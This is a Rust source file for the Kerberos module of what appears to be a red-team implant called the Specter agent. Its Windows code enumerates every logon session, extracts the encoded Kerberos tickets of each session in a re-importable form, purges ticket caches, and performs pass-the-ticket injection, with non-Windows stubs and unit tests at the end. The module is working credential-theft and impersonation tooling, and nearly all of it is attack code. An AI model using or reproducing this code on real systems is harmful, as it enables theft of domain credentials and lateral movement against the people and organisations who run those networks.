//! Kerberos ticket operations for the Specter agent.
//!
//! On Windows this module drives Kerberos ticket queries via the Local Security
//! Authority (LSA) subsystem: list tickets (`KERB_QUERY_TKT_CACHE_EX_REQUEST`),
//! purge tickets (`KERB_PURGE_TKT_CACHE_REQUEST`), pass-the-ticket
//! (`KERB_SUBMIT_TKT_REQUEST`), and LUID retrieval via `GetTokenInformation`.
//!
//! On non-Windows platforms, stub implementations return `ERROR_NOT_SUPPORTED`.

/// Information about a logon session, containing zero or more Kerberos tickets.
#[derive(Debug, Clone)]
pub struct SessionInfo {
    /// Account user name.
    pub user_name: String,
    /// Account domain.
    pub domain: String,
    /// Logon ID (LUID) low part.
    pub logon_id_low: u32,
    /// Logon ID (LUID) high part.
    pub logon_id_high: u32,
    /// Session identifier.
    pub session: u32,
    /// SID as a string.
    pub user_sid: String,
    /// Logon time — FILETIME low part.
    pub logon_time_low: u32,
    /// Logon time — FILETIME high part.
    pub logon_time_high: u32,
    /// Logon type (interactive, network, …).
    pub logon_type: u32,
    /// Authentication package name (e.g. "Kerberos", "NTLM").
    pub auth_package: String,
    /// Logon server name.
    pub logon_server: String,
    /// DNS domain of the logon server.
    pub logon_server_dns_domain: String,
    /// User principal name.
    pub upn: String,
    /// Kerberos tickets associated with this session.
    pub tickets: Vec<TicketInfo>,
}

/// Information about a single cached Kerberos ticket.
#[derive(Debug, Clone)]
pub struct TicketInfo {
    /// Client principal name.
    pub client_name: String,
    /// Client realm.
    pub client_realm: String,
    /// Server principal name.
    pub server_name: String,
    /// Server realm.
    pub server_realm: String,
    /// Start time — FILETIME low part.
    pub start_time_low: u32,
    /// Start time — FILETIME high part.
    pub start_time_high: u32,
    /// End time — FILETIME low part.
    pub end_time_low: u32,
    /// End time — FILETIME high part.
    pub end_time_high: u32,
    /// Renew time — FILETIME low part.
    pub renew_time_low: u32,
    /// Renew time — FILETIME high part.
    pub renew_time_high: u32,
    /// Encryption type (e.g. 23 = RC4-HMAC, 18 = AES256-CTS).
    pub encryption_type: u32,
    /// Ticket flags (forwardable, renewable, etc.).
    pub ticket_flags: u32,
    /// Raw encoded ticket bytes.
    pub ticket_data: Vec<u8>,
}

/// LUID (Logon User ID) — high and low 32-bit parts.
#[derive(Debug, Clone, Copy)]
pub struct Luid {
    /// High 32-bit part.
    pub high: u32,
    /// Low 32-bit part.
    pub low: u32,
}

// ─── Windows native implementation ─────────────────────────────────────────

#[cfg(windows)]
#[allow(unsafe_code)]
pub mod native {
    //! Windows-native Kerberos operations via LSA APIs.

    use std::mem;
    use std::ptr;

    use windows_sys::Win32::Foundation::{
        CloseHandle, FALSE, GetLastError, HANDLE, LUID, NTSTATUS, TRUE, UNICODE_STRING,
    };
    use windows_sys::Win32::Security::Authentication::Identity::{
        KERB_EXTERNAL_NAME, KERB_EXTERNAL_TICKET, KERB_PROTOCOL_MESSAGE_TYPE,
        KERB_PURGE_TKT_CACHE_REQUEST, KERB_QUERY_TKT_CACHE_EX_RESPONSE,
        KERB_QUERY_TKT_CACHE_REQUEST, KERB_RETRIEVE_TKT_REQUEST, KERB_RETRIEVE_TKT_RESPONSE,
        KERB_SUBMIT_TKT_REQUEST, KERB_TICKET_CACHE_INFO_EX, KerbPurgeTicketCacheMessage,
        KerbQueryTicketCacheExMessage, KerbRetrieveEncodedTicketMessage, KerbSubmitTicketMessage,
        LsaCallAuthenticationPackage, LsaConnectUntrusted, LsaDeregisterLogonProcess,
        LsaEnumerateLogonSessions, LsaFreeReturnBuffer, LsaGetLogonSessionData,
        LsaLookupAuthenticationPackage, LsaRegisterLogonProcess, SECURITY_LOGON_SESSION_DATA,
    };
    use windows_sys::Win32::Security::{
        GetTokenInformation, TOKEN_QUERY, TOKEN_STATISTICS, TokenStatistics,
    };
    use windows_sys::Win32::System::Threading::{
        GetCurrentProcess, GetCurrentThread, OpenProcessToken, OpenThreadToken,
    };

    use super::{Luid, SessionInfo, TicketInfo};

    /// Kerberos authentication package name as a byte string.
    const KERBEROS_PACKAGE: &[u8] = b"Kerberos";

    /// Flag used with `KERB_RETRIEVE_TKT_REQUEST` to retrieve the ticket
    /// as a KERB_CRED structure suitable for re-import.
    const KERB_RETRIEVE_TICKET_AS_KERB_CRED: u32 = 0x8;

    /// Get the LUID of the current thread/process token.
    pub fn get_luid() -> Result<Luid, u32> {
        let token = current_token_handle()?;

        let mut stats: TOKEN_STATISTICS = unsafe { mem::zeroed() };
        let mut ret_len: u32 = 0;

        let ok = unsafe {
            GetTokenInformation(
                token,
                TokenStatistics,
                (&raw mut stats).cast(),
                mem::size_of::<TOKEN_STATISTICS>() as u32,
                &mut ret_len,
            )
        };

        unsafe { CloseHandle(token) };

        if ok == FALSE {
            return Err(unsafe { GetLastError() });
        }

        Ok(Luid {
            high: stats.AuthenticationId.HighPart as u32,
            low: stats.AuthenticationId.LowPart,
        })
    }

    /// List all Kerberos tickets across logon sessions.
    ///
    /// If `target_luid` is `Some`, only the matching session is returned.
    pub fn klist(target_luid: Option<u32>) -> Result<Vec<SessionInfo>, u32> {
        let (lsa_handle, kerb_package_id) = open_lsa_and_lookup_kerberos()?;

        // Enumerate logon sessions.
        let mut count: u32 = 0;
        let mut luid_list: *mut LUID = ptr::null_mut();
        let status = unsafe { LsaEnumerateLogonSessions(&mut count, &mut luid_list) };
        if status != 0 {
            close_lsa(lsa_handle);
            return Err(lsa_ntstatus_to_win32(status));
        }

        let mut sessions = Vec::new();

        for i in 0..count {
            let luid = unsafe { *luid_list.add(i as usize) };

            // If filtering by LUID, skip non-matching sessions.
            if let Some(target) = target_luid {
                if luid.LowPart != target {
                    continue;
                }
            }

            if let Ok(session) = collect_session(lsa_handle, kerb_package_id, &luid) {
                sessions.push(session);
            }
        }

        if !luid_list.is_null() {
            unsafe { LsaFreeReturnBuffer(luid_list.cast()) };
        }
        close_lsa(lsa_handle);

        Ok(sessions)
    }

    /// Purge Kerberos tickets for the given LUID.
    pub fn purge(target_luid: u32) -> Result<(), u32> {
        let (lsa_handle, kerb_package_id) = open_lsa_and_lookup_kerberos()?;

        let mut request: KERB_PURGE_TKT_CACHE_REQUEST = unsafe { mem::zeroed() };
        request.MessageType = KerbPurgeTicketCacheMessage;
        request.LogonId = LUID { LowPart: target_luid, HighPart: 0 };

        let mut protocol_status: NTSTATUS = 0;
        let mut response_ptr: *mut core::ffi::c_void = ptr::null_mut();
        let mut response_len: u32 = 0;

        let status = unsafe {
            LsaCallAuthenticationPackage(
                lsa_handle,
                kerb_package_id,
                (&raw const request).cast(),
                mem::size_of::<KERB_PURGE_TKT_CACHE_REQUEST>() as u32,
                &mut response_ptr,
                &mut response_len,
                &mut protocol_status,
            )
        };

        if !response_ptr.is_null() {
            unsafe { LsaFreeReturnBuffer(response_ptr) };
        }
        close_lsa(lsa_handle);

        if status != 0 {
            return Err(lsa_ntstatus_to_win32(status));
        }
        if protocol_status != 0 {
            return Err(lsa_ntstatus_to_win32(protocol_status));
        }

        Ok(())
    }

    /// Import a Kerberos ticket (pass-the-ticket) for the given LUID.
    pub fn ptt(ticket: &[u8], target_luid: u32) -> Result<(), u32> {
        let (lsa_handle, kerb_package_id) = open_lsa_and_lookup_kerberos()?;

        // Allocate buffer for KERB_SUBMIT_TKT_REQUEST + ticket data.
        let base_size = mem::size_of::<KERB_SUBMIT_TKT_REQUEST>();
        let total_size = base_size + ticket.len();
        let mut buf = vec![0u8; total_size];

        let request: &mut KERB_SUBMIT_TKT_REQUEST = unsafe { &mut *(buf.as_mut_ptr().cast()) };
        request.MessageType = KerbSubmitTicketMessage;
        request.LogonId = LUID { LowPart: target_luid, HighPart: 0 };
        request.KerbCredSize = ticket.len() as u32;
        request.KerbCredOffset = base_size as u32;

        // Copy ticket data after the struct.
        buf[base_size..].copy_from_slice(ticket);

        let mut protocol_status: NTSTATUS = 0;
        let mut response_ptr: *mut core::ffi::c_void = ptr::null_mut();
        let mut response_len: u32 = 0;

        let status = unsafe {
            LsaCallAuthenticationPackage(
                lsa_handle,
                kerb_package_id,
                buf.as_ptr().cast(),
                total_size as u32,
                &mut response_ptr,
                &mut response_len,
                &mut protocol_status,
            )
        };

        if !response_ptr.is_null() {
            unsafe { LsaFreeReturnBuffer(response_ptr) };
        }
        close_lsa(lsa_handle);

        if status != 0 {
            return Err(lsa_ntstatus_to_win32(status));
        }
        if protocol_status != 0 {
            return Err(lsa_ntstatus_to_win32(protocol_status));
        }

        Ok(())
    }

    // ── Internal helpers ────────────────────────────────────────────────────

    /// Open an LSA handle and look up the Kerberos authentication package ID.
    fn open_lsa_and_lookup_kerberos() -> Result<(HANDLE, u32), u32> {
        let lsa_handle = open_lsa_handle()?;
        let package_id = lookup_kerberos_package(lsa_handle)?;
        Ok((lsa_handle, package_id))
    }

    /// Open a handle to the LSA.
    ///
    /// Tries `LsaRegisterLogonProcess` (requires SeTcbPrivilege / SYSTEM).
    /// Falls back to `LsaConnectUntrusted` for unprivileged access.
    fn open_lsa_handle() -> Result<HANDLE, u32> {
        let mut handle: HANDLE = 0;

        // Try privileged first.
        let mut name = lsa_string(b"RedCell");
        let mut mode: u32 = 0;
        let status = unsafe { LsaRegisterLogonProcess(&mut name, &mut handle, &mut mode) };
        if status == 0 {
            return Ok(handle);
        }

        // Fall back to untrusted.
        let status = unsafe { LsaConnectUntrusted(&mut handle) };
        if status != 0 {
            return Err(lsa_ntstatus_to_win32(status));
        }

        Ok(handle)
    }

    /// Look up the Kerberos authentication package.
    fn lookup_kerberos_package(lsa_handle: HANDLE) -> Result<u32, u32> {
        let mut name = lsa_string(KERBEROS_PACKAGE);
        let mut package_id: u32 = 0;
        let status =
            unsafe { LsaLookupAuthenticationPackage(lsa_handle, &mut name, &mut package_id) };
        if status != 0 {
            return Err(lsa_ntstatus_to_win32(status));
        }
        Ok(package_id)
    }

    /// Close an LSA handle (deregister or simply close).
    fn close_lsa(handle: HANDLE) {
        unsafe { LsaDeregisterLogonProcess(handle) };
    }

    /// Collect session info and tickets for a single LUID.
    fn collect_session(
        lsa_handle: HANDLE,
        kerb_package_id: u32,
        luid: &LUID,
    ) -> Result<SessionInfo, u32> {
        let mut session_data: *mut SECURITY_LOGON_SESSION_DATA = ptr::null_mut();
        let status = unsafe { LsaGetLogonSessionData(luid, &mut session_data) };
        if status != 0 || session_data.is_null() {
            if !session_data.is_null() {
                unsafe { LsaFreeReturnBuffer(session_data.cast()) };
            }
            return Err(lsa_ntstatus_to_win32(status));
        }

        let sd = unsafe { &*session_data };

        let session_info_partial = SessionInfo {
            user_name: unicode_string_to_string(&sd.UserName),
            domain: unicode_string_to_string(&sd.LogonDomain),
            logon_id_low: sd.LogonId.LowPart,
            logon_id_high: sd.LogonId.HighPart as u32,
            session: sd.Session,
            user_sid: sid_to_string(sd.Sid),
            logon_time_low: sd.LogonTime as u32,
            logon_time_high: (sd.LogonTime >> 32) as u32,
            logon_type: sd.LogonType,
            auth_package: unicode_string_to_string(&sd.AuthenticationPackage),
            logon_server: unicode_string_to_string(&sd.LogonServer),
            logon_server_dns_domain: unicode_string_to_string(&sd.DnsDomainName),
            upn: unicode_string_to_string(&sd.Upn),
            tickets: Vec::new(),
        };

        unsafe { LsaFreeReturnBuffer(session_data.cast()) };

        // Query ticket cache for this session.
        let tickets = query_ticket_cache(lsa_handle, kerb_package_id, luid);

        Ok(SessionInfo { tickets, ..session_info_partial })
    }

    /// Query the Kerberos ticket cache for a given LUID and extract ticket data.
    fn query_ticket_cache(
        lsa_handle: HANDLE,
        kerb_package_id: u32,
        luid: &LUID,
    ) -> Vec<TicketInfo> {
        let mut request: KERB_QUERY_TKT_CACHE_REQUEST = unsafe { mem::zeroed() };
        request.MessageType = KerbQueryTicketCacheExMessage;
        request.LogonId = *luid;

        let mut protocol_status: NTSTATUS = 0;
        let mut response_ptr: *mut core::ffi::c_void = ptr::null_mut();
        let mut response_len: u32 = 0;

        let status = unsafe {
            LsaCallAuthenticationPackage(
                lsa_handle,
                kerb_package_id,
                (&raw const request).cast(),
                mem::size_of::<KERB_QUERY_TKT_CACHE_REQUEST>() as u32,
                &mut response_ptr,
                &mut response_len,
                &mut protocol_status,
            )
        };

        if status != 0 || protocol_status != 0 || response_ptr.is_null() {
            if !response_ptr.is_null() {
                unsafe { LsaFreeReturnBuffer(response_ptr) };
            }
            return Vec::new();
        }

        let response: &KERB_QUERY_TKT_CACHE_EX_RESPONSE = unsafe { &*(response_ptr.cast()) };

        let count = response.CountOfTickets as usize;
        let cache_entries = unsafe { std::slice::from_raw_parts(response.Tickets.as_ptr(), count) };

        let mut tickets = Vec::with_capacity(count);
        for entry in cache_entries {
            let ticket_data = extract_ticket(lsa_handle, kerb_package_id, luid, entry);
            tickets.push(TicketInfo {
                client_name: unicode_string_to_string(&entry.ClientName),
                client_realm: unicode_string_to_string(&entry.ClientRealm),
                server_name: unicode_string_to_string(&entry.ServerName),
                server_realm: unicode_string_to_string(&entry.ServerRealm),
                start_time_low: entry.StartTime as u32,
                start_time_high: (entry.StartTime >> 32) as u32,
                end_time_low: entry.EndTime as u32,
                end_time_high: (entry.EndTime >> 32) as u32,
                renew_time_low: entry.RenewTime as u32,
                renew_time_high: (entry.RenewTime >> 32) as u32,
                encryption_type: entry.EncryptionType as u32,
                ticket_flags: entry.TicketFlags,
                ticket_data,
            });
        }

        unsafe { LsaFreeReturnBuffer(response_ptr) };
        tickets
    }

    /// Extract the encoded ticket bytes for a single cache entry.
    fn extract_ticket(
        lsa_handle: HANDLE,
        kerb_package_id: u32,
        luid: &LUID,
        entry: &KERB_TICKET_CACHE_INFO_EX,
    ) -> Vec<u8> {
        // Build a KERB_RETRIEVE_TKT_REQUEST with the target name set to the
        // server principal from the cache entry.
        let base_size = mem::size_of::<KERB_RETRIEVE_TKT_REQUEST>();
        let server_name_bytes = entry.ServerName.Length as usize;
        let total_size = base_size + server_name_bytes;
        let mut buf = vec![0u8; total_size];

        let request: &mut KERB_RETRIEVE_TKT_REQUEST = unsafe { &mut *(buf.as_mut_ptr().cast()) };
        request.MessageType = KerbRetrieveEncodedTicketMessage;
        request.LogonId = *luid;
        request.CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
        request.EncryptionType = entry.EncryptionType;

        // Set up the TargetName UNICODE_STRING to point into our buffer.
        request.TargetName.Length = entry.ServerName.Length;
        request.TargetName.MaximumLength = entry.ServerName.Length;
        // The string data starts right after the struct.
        let name_offset = base_size;
        if !entry.ServerName.Buffer.is_null() && server_name_bytes > 0 {
            unsafe {
                ptr::copy_nonoverlapping(
                    entry.ServerName.Buffer.cast::<u8>(),
                    buf.as_mut_ptr().add(name_offset),
                    server_name_bytes,
                );
            }
            // Point Buffer into our allocation.
            request.TargetName.Buffer = unsafe { buf.as_ptr().add(name_offset) as *mut u16 };
        }

        let mut protocol_status: NTSTATUS = 0;
        let mut response_ptr: *mut core::ffi::c_void = ptr::null_mut();
        let mut response_len: u32 = 0;

        let status = unsafe {
            LsaCallAuthenticationPackage(
                lsa_handle,
                kerb_package_id,
                buf.as_ptr().cast(),
                total_size as u32,
                &mut response_ptr,
                &mut response_len,
                &mut protocol_status,
            )
        };

        if status != 0 || protocol_status != 0 || response_ptr.is_null() {
            if !response_ptr.is_null() {
                unsafe { LsaFreeReturnBuffer(response_ptr) };
            }
            return Vec::new();
        }

        let response: &KERB_RETRIEVE_TKT_RESPONSE = unsafe { &*(response_ptr.cast()) };
        let ticket = &response.Ticket;
        let encoded_len = ticket.EncodedTicketSize as usize;
        let encoded_ticket = if encoded_len > 0 && !ticket.EncodedTicket.is_null() {
            unsafe { std::slice::from_raw_parts(ticket.EncodedTicket, encoded_len) }.to_vec()
        } else {
            Vec::new()
        };

        unsafe { LsaFreeReturnBuffer(response_ptr) };
        encoded_ticket
    }

    /// Get a token handle for the current thread or process.
    fn current_token_handle() -> Result<HANDLE, u32> {
        let mut handle: HANDLE = 0;
        unsafe {
            if OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &mut handle) != FALSE {
                return Ok(handle);
            }
            if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut handle) == FALSE {
                return Err(GetLastError());
            }
        }
        Ok(handle)
    }

    /// Convert a `UNICODE_STRING` to a Rust `String`.
    fn unicode_string_to_string(us: &UNICODE_STRING) -> String {
        if us.Buffer.is_null() || us.Length == 0 {
            return String::new();
        }
        let len_chars = us.Length as usize / 2;
        let slice = unsafe { std::slice::from_raw_parts(us.Buffer, len_chars) };
        String::from_utf16_lossy(slice)
    }

    /// Convert a SID pointer to a string representation.
    fn sid_to_string(sid: *mut core::ffi::c_void) -> String {
        if sid.is_null() {
            return String::new();
        }
        use windows_sys::Win32::Security::Authorization::ConvertSidToStringSidW;
        let mut str_ptr: *mut u16 = ptr::null_mut();
        let ok = unsafe { ConvertSidToStringSidW(sid, &mut str_ptr) };
        if ok == FALSE || str_ptr.is_null() {
            return String::new();
        }
        let mut len = 0;
        unsafe {
            while *str_ptr.add(len) != 0 {
                len += 1;
            }
        }
        let s = unsafe { String::from_utf16_lossy(std::slice::from_raw_parts(str_ptr, len)) };
        unsafe {
            windows_sys::Win32::Foundation::LocalFree(str_ptr.cast());
        }
        s
    }

    /// Build an LSA_STRING from a byte slice.
    fn lsa_string(s: &[u8]) -> windows_sys::Win32::Security::Authentication::Identity::LSA_STRING {
        windows_sys::Win32::Security::Authentication::Identity::LSA_STRING {
            Length: s.len() as u16,
            MaximumLength: s.len() as u16,
            Buffer: s.as_ptr().cast_mut(),
        }
    }

    /// Convert an NTSTATUS to a Win32 error code.
    fn lsa_ntstatus_to_win32(status: NTSTATUS) -> u32 {
        use windows_sys::Win32::Security::Authentication::Identity::LsaNtStatusToWinError;
        unsafe { LsaNtStatusToWinError(status) }
    }
}

// ─── Non-Windows stubs ─────────────────────────────────────────────────────

#[cfg(not(windows))]
pub mod native {
    //! Stub implementations for non-Windows platforms.
    //!
    //! Kerberos ticket operations require the Windows LSA subsystem.
    //! These stubs return `ERROR_NOT_SUPPORTED` so the agent can compile
    //! and return appropriate error responses on unsupported platforms.

    use super::{Luid, SessionInfo};

    /// Windows error code for "not supported".
    const ERROR_NOT_SUPPORTED: u32 = 50;

    /// Stub: always returns `Err`.
    pub fn get_luid() -> Result<Luid, u32> {
        Err(ERROR_NOT_SUPPORTED)
    }

    /// Stub: always returns `Err`.
    pub fn klist(_target_luid: Option<u32>) -> Result<Vec<SessionInfo>, u32> {
        Err(ERROR_NOT_SUPPORTED)
    }

    /// Stub: always returns `Err`.
    pub fn purge(_target_luid: u32) -> Result<(), u32> {
        Err(ERROR_NOT_SUPPORTED)
    }

    /// Stub: always returns `Err`.
    pub fn ptt(_ticket: &[u8], _target_luid: u32) -> Result<(), u32> {
        Err(ERROR_NOT_SUPPORTED)
    }
}

// ─── Tests ─────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn session_info_default_fields() {
        let session = SessionInfo {
            user_name: "admin".to_string(),
            domain: "CORP".to_string(),
            logon_id_low: 0x1234,
            logon_id_high: 0,
            session: 1,
            user_sid: "S-1-5-21-1234".to_string(),
            logon_time_low: 100,
            logon_time_high: 200,
            logon_type: 2,
            auth_package: "Kerberos".to_string(),
            logon_server: "DC01".to_string(),
            logon_server_dns_domain: "corp.local".to_string(),
            upn: "admin@corp.local".to_string(),
            tickets: vec![],
        };
        assert_eq!(session.user_name, "admin");
        assert!(session.tickets.is_empty());
    }

    #[test]
    fn ticket_info_round_trip() {
        let ticket = TicketInfo {
            client_name: "user".to_string(),
            client_realm: "CORP.LOCAL".to_string(),
            server_name: "krbtgt/CORP.LOCAL".to_string(),
            server_realm: "CORP.LOCAL".to_string(),
            start_time_low: 0xAABB,
            start_time_high: 0xCCDD,
            end_time_low: 0x1111,
            end_time_high: 0x2222,
            renew_time_low: 0x3333,
            renew_time_high: 0x4444,
            encryption_type: 18,
            ticket_flags: 0x4000_0000,
            ticket_data: vec![0x61, 0x82, 0x03],
        };
        assert_eq!(ticket.encryption_type, 18);
        assert_eq!(ticket.ticket_data.len(), 3);
    }

    #[test]
    fn luid_fields() {
        let luid = Luid { high: 0, low: 0x12345678 };
        assert_eq!(luid.low, 0x12345678);
        assert_eq!(luid.high, 0);
    }

    #[cfg(not(windows))]
    #[test]
    fn stubs_return_not_supported() {
        assert!(native::get_luid().is_err());
        assert!(native::klist(None).is_err());
        assert!(native::purge(0).is_err());
        assert!(native::ptt(&[], 0).is_err());
    }
}
